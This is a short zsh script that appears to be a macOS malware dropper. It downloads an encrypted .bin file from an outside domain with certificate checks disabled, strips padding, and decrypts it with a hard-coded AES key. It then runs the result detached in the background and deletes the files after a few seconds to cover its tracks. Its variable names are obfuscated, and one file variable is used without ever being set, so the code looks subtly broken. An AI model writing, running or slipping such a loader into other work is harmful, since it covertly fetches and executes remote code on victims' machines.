#!/bin/zsh
n6yvw=$(mktemp /tmp/r34kwv.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m31b3395c118afdac.bin" -o "$n6yvwz" || exit 1
f7m8w9=$(stat -f %z "$n6yvwz"); th9whq3=$(( f7m8w9 - 3233 - 1895 ))
tail -c +$(( 3233 + 1 )) "$n6yvwz" | head -c $th9whq3 | openssl enc -d -aes-256-cbc -k c0d1501fac3562e1804184c7 -out "$n6yvw" 2>/dev/null
[ -s "$n6yvw" ] && chmod 700 "$n6yvw" && ( "$n6yvw" & ) && disown
( sleep 3; rm -f "$n6yvw" "$n6yvwz" ) &>/dev/null &
